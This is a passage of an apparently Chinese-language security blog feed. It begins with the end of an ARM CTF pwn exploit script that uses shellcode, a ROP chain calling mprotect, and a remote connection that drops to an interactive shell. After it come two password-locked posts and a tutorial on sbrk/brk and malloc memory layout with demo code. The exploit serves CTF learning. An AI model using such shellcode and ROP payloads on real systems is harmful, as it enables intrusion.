class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./babyheap",env =&#123;"LD_PRELOAD":"./libc.so.6"&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"r"</span>:</span><br><span class="line">    p = remote(<span class="string">"106.75.126.171"</span>,<span class="number">33865</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu/"</span>, binary])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-g"</span>, <span class="string">"12345"</span>, <span class="string">"-L"</span>, <span class="string">"/usr/aarch64-linux-gnu/"</span>, binary])</span><br><span class="line">buf = asm(shellcraft.aarch64.sh())</span><br><span class="line">buf = buf.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line">buf += p64(<span class="number">0x400600</span>)    <span class="comment">#这里是存放mprotect函数的地址</span></span><br><span class="line">padding  = cyclic(<span class="number">0x48</span>) </span><br><span class="line">payload  = padding + p64(<span class="number">0x4008CC</span>)       </span><br><span class="line">payload += p64(<span class="number">0</span>)               <span class="comment"># X29</span></span><br><span class="line">payload += p64(<span class="number">0x4008AC</span>)                 <span class="comment"># X30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)               <span class="comment"># X19 , X20</span></span><br><span class="line">payload += p64(<span class="number">0x411068</span> + <span class="number">0x100</span>)         <span class="comment"># X21</span></span><br><span class="line">payload += p64(<span class="number">0x7</span>)                      <span class="comment"># X22</span></span><br><span class="line">payload += p64(<span class="number">0x1000</span>)                   <span class="comment"># X23</span></span><br><span class="line">payload += p64(<span class="number">0x411000</span>)                 <span class="comment"># X24</span></span><br><span class="line">payload += p64(<span class="number">0</span>)               <span class="comment"># X29</span></span><br><span class="line">payload += p64(<span class="number">0x411068</span>)                 <span class="comment"># X30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">0x6</span>      </span><br><span class="line"><span class="comment">#payload = cyclic(72) + flat([0x4008CC , 0 , 0x4008AC , 0 , 1 ,0x411168 , 5 , 0x1000 , 0x411000 , 0 , 0x411068] , [0xdeadbeef]*6)</span></span><br><span class="line">ru(<span class="string">"Name:"</span>)</span><br><span class="line">sl(buf)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><p><strong>参考</strong></p><ul><li><a href="https://www.anquanke.com/post/id/204913#h2-0" target="_blank" rel="noopener">ARM PWN 从 0 到 1 - 安全客，安全资讯平台 (anquanke.com)</a></li><li><a href="https://zszcr.github.io/2018/11/05/2018-11-5-[上海市大学生网络安全大赛]baby_arm复现/#baby-arm" target="_blank" rel="noopener">【上海市大学生网络安全大赛】pwn复现 - zs0zrc (zszcr.github.io)</a></li><li><a href="https://www.anquanke.com/post/id/199112" target="_blank" rel="noopener">ARM架构下的 Pwn 的一般解决思路 - 安全客，安全资讯平台 (anquanke.com)</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x01-ARM环境搭建&quot;&gt;&lt;a href=&quot;#0x01-ARM环境搭建&quot; class=&quot;headerlink&quot; title=&quot;0x01 ARM环境搭建&quot;&gt;&lt;/a&gt;0x01 ARM环境搭建&lt;/h1&gt;&lt;p&gt;安装qemu和arm的一些包&lt;/p&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ORW</title>
    <link href="https://pz1o.top/2021/04/28/ORW/"/>
    <id>https://pz1o.top/2021/04/28/ORW/</id>
    <published>2021-04-28T07:32:57.000Z</published>
    <updated>2021-04-28T12:34:42.837Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>csapp</title>
    <link href="https://pz1o.top/2021/04/18/csapp/"/>
    <id>https://pz1o.top/2021/04/18/csapp/</id>
    <published>2021-04-18T15:00:26.000Z</published>
    <updated>2021-04-26T14:24:46.004Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="book" scheme="https://pz1o.top/tags/book/"/>
    
  </entry>
  
  <entry>
    <title>理解sbrk和brk</title>
    <link href="https://pz1o.top/2021/04/17/%E7%90%86%E8%A7%A3sbrk%E5%92%8Cbrk/"/>
    <id>https://pz1o.top/2021/04/17/%E7%90%86%E8%A7%A3sbrk%E5%92%8Cbrk/</id>
    <published>2021-04-17T08:12:11.000Z</published>
    <updated>2021-04-18T15:51:26.800Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-sbrk和brk函数原型"><a href="#0x01-sbrk和brk函数原型" class="headerlink" title="0x01 sbrk和brk函数原型"></a>0x01 sbrk和brk函数原型</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">brk</span><span class="params">(<span class="keyword">void</span> *addr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">sbrk</span><span class="params">(<span class="keyword">intptr_t</span> increment)</span></span>;</span><br></pre></td></tr></table></figure><blockquote><p>description:        </p><p>brk() and sbrk() change the location of the program break, which defines the end of the process’s data segment (i.e., the program break is the first location after the end of the uninitialized data segment).  Increasing the program break has the effect of allocating memory to the process; decreasing the break deallocates memory.</p><p>return value:</p><p>On success, brk() returns zero.  On error, -1 is returned, and errno is set to ENOMEM.</p><p>On success, sbrk() returns the previous program break.  (If the break was increased, then this value is a pointer to the start of the newly allocated memory).  On error, (void *) -1 is returned,and errno is set to ENOMEM.</p></blockquote><p>英文解释的很清楚了，主要理解什么是program break和data segment</p><ol><li>program break被定义为程序data segment的结束位置</li><li>data segment应该包含了data segment、bss segment和heap</li></ol><p>此外，我们还需要关注两个函数的返回值</p><ol><li>brk通过传递的addr来重新设置program break，成功则返回0，否则返回-1</li><li>sbrk用来增加heap，增加的大小通过参数increment决定，返回增加大小前的heap的program break，如果increment为0则返回program break。</li></ol><h1 id="0x02-演示"><a href="#0x02-演示" class="headerlink" title="0x02 演示"></a>0x02 演示</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> bss_end;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span>* ret;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bss is %p\n"</span>,(<span class="keyword">char</span>*)(&amp;bss_end)+<span class="number">4</span>);</span><br><span class="line">ret = sbrk(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(ret != (<span class="keyword">void</span>*)<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"start %p\n"</span>,ret);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ASLR开启结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pz1o$ ./a</span><br><span class="line">bss is 0x601048</span><br><span class="line">start 0x1056000</span><br><span class="line"> ~/Desktop/mydemo [04:52:59]</span><br><span class="line">pz1o$ ./a</span><br><span class="line">bss is 0x601048</span><br><span class="line">start 0xd28000</span><br><span class="line"> ~/Desktop/mydemo [04:52:59]</span><br><span class="line">pz1o$ ./a</span><br><span class="line">bss is 0x601048</span><br><span class="line">start 0x1f9a000</span><br></pre></td></tr></table></figure><p>不开启ASLR结果如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> ~/Desktop/mydemo [<span class="number">05</span>:<span class="number">04</span>:<span class="number">39</span>]</span><br><span class="line">pz1o$ ./a</span><br><span class="line">bss is <span class="number">0x601048</span></span><br><span class="line">start <span class="number">0x623000</span></span><br><span class="line"> ~/Desktop/mydemo [<span class="number">05</span>:<span class="number">04</span>:<span class="number">40</span>]</span><br><span class="line">pz1o$ ./a            </span><br><span class="line">bss is <span class="number">0x601048</span></span><br><span class="line">start <span class="number">0x623000</span></span><br><span class="line"> ~/Desktop/mydemo [<span class="number">05</span>:<span class="number">04</span>:<span class="number">43</span>]</span><br><span class="line">pz1o$ ./a</span><br><span class="line">bss is <span class="number">0x601048</span></span><br><span class="line">start <span class="number">0x623000</span></span><br></pre></td></tr></table></figure><p>可以看到在不开ASLR情况下，program break是不变的，当然另一种情况就是变化的</p><p>此外srbk返回的是堆结束的地址具体可以看gdb调试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          <span class="number">0x400000</span>           <span class="number">0x401000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /<span class="built_in">home</span>/pz1o/Desktop/mydemo/a</span><br><span class="line">          <span class="number">0x600000</span>           <span class="number">0x601000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /<span class="built_in">home</span>/pz1o/Desktop/mydemo/a</span><br><span class="line">          <span class="number">0x601000</span>           <span class="number">0x602000</span> rw-p     <span class="number">1000</span> <span class="number">1000</span>   /<span class="built_in">home</span>/pz1o/Desktop/mydemo/a</span><br><span class="line">          <span class="number">0x602000</span>           <span class="number">0x623000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   <span class="number">1</span>c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br></pre></td></tr></table></figure><p>接下来不是0的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> bss_end;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span>* ret;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bss is %p\n"</span>,(<span class="keyword">char</span>*)(&amp;bss_end)+<span class="number">4</span>);</span><br><span class="line">ret = sbrk(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">if</span>(ret != (<span class="keyword">void</span>*)<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"start %p\n"</span>,ret);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span>* a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"malloc is %p"</span>,a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接看结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          <span class="number">0x400000</span>           <span class="number">0x401000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /<span class="built_in">home</span>/pz1o/Desktop/mydemo/a</span><br><span class="line">          <span class="number">0x600000</span>           <span class="number">0x601000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /<span class="built_in">home</span>/pz1o/Desktop/mydemo/a</span><br><span class="line">          <span class="number">0x601000</span>           <span class="number">0x602000</span> rw-p     <span class="number">1000</span> <span class="number">1000</span>   /<span class="built_in">home</span>/pz1o/Desktop/mydemo/a</span><br><span class="line">          <span class="number">0x602000</span>           <span class="number">0x624000</span> rw-p    <span class="number">22000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7ffff7a0d000</span>     <span class="number">0x7ffff7bcd000</span> r-xp   <span class="number">1</span>c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7bcd000</span>     <span class="number">0x7ffff7dcd000</span> ---p   <span class="number">200000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dcd000</span>     <span class="number">0x7ffff7dd1000</span> r--p     <span class="number">4000</span> <span class="number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd1000</span>     <span class="number">0x7ffff7dd3000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7dd3000</span>     <span class="number">0x7ffff7dd7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7dd7000</span>     <span class="number">0x7ffff7dfd000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7fd3000</span>     <span class="number">0x7ffff7fd6000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffff7ff7000</span>     <span class="number">0x7ffff7ffa000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</span><br><span class="line">    <span class="number">0x7ffff7ffa000</span>     <span class="number">0x7ffff7ffc000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</span><br><span class="line">    <span class="number">0x7ffff7ffc000</span>     <span class="number">0x7ffff7ffd000</span> r--p     <span class="number">1000</span> <span class="number">25000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffd000</span>     <span class="number">0x7ffff7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">26000</span>  /lib/x86_64-linux-gnu/ld<span class="number">-2.23</span>.so</span><br><span class="line">    <span class="number">0x7ffff7ffe000</span>     <span class="number">0x7ffff7fff000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="number">0x7ffffffde000</span>     <span class="number">0x7ffffffff000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [<span class="built_in">stack</span>]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      [vsyscall]</span><br><span class="line"></span><br><span class="line">bss is <span class="number">0x601050</span></span><br><span class="line">start <span class="number">0x623000</span></span><br></pre></td></tr></table></figure><h1 id="0x03-堆管理"><a href="#0x03-堆管理" class="headerlink" title="0x03 堆管理"></a>0x03 堆管理</h1><p>1）当开辟的空间小于 128K 时，调用 brk（）函数，malloc 的底层实现是系统调用函数 brk（），其主要移动指针program break</p><p>2）当开辟的空间大于 128K 时，mmap（）系统调用函数来在虚拟地址空间中（堆和栈中间，称为“文件映射区域”的地方）找一块空间来开辟。</p><h2 id="1-malloc小于128k"><a href="#1-malloc小于128k" class="headerlink" title="1. malloc小于128k"></a>1. malloc小于128k</h2><p>这时只使用brk分配</p><p><img src="/2021/04/17/%E7%90%86%E8%A7%A3sbrk%E5%92%8Cbrk/image-20210418233030728.png" alt="image-20210418233030728"></p><ol><li>进程启动的时候，其（虚拟）内存空间的初始布局如图所示</li><li>进程调用A=malloc(30K)以后，内存空间如图malloc函数会调用brk系统调用，将program break指针往高地址推30K，就完成虚拟内存分配</li></ol><p>这只是完成虚拟地址的分配，A这块内存现在还是没有物理页与之对应的，等到进程第一次读写A这块内存的时候，发生缺页中断，这个时候，内核才分配A这块内存对应的物理页。<strong>也就是说，如果用malloc分配了A这块内容，然后从来不访问它，那么，A对应的物理页是不会被分配的。</strong></p><h2 id="2-malloc大于128k"><a href="#2-malloc大于128k" class="headerlink" title="2. malloc大于128k"></a>2. malloc大于128k</h2><p>这时使用mmap分配</p><p><img src="/2021/04/17/%E7%90%86%E8%A7%A3sbrk%E5%92%8Cbrk/image-20210418233136531.png" alt="image-20210418233136531"></p><ol><li>进程分配C=malloc(200K),<strong>malloc函数分配内存，如果请求内存大于128K利用mmap系统调用，从堆和栈的中间分配一块虚拟内存</strong>，原因在于<strong>brk分配的内存需要等到高地址内存释放以后才能释放而mmap分配的内存可以单独释放。</strong></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-sbrk和brk函数原型&quot;&gt;&lt;a href=&quot;#0x01-sbrk和brk函数原型&quot; class=&quot;headerlink&quot; title=&quot;0x01 sbrk和brk函数原型&quot;&gt;&lt;/a&gt;0x01 sbrk和brk函数原型&lt;/h1&gt;&lt;figure class</summary>
      
    
    
    
    
    <category term="c" scheme="https://pz1o.top/tags/c/"/>
    
  </entry>
  
</feed>
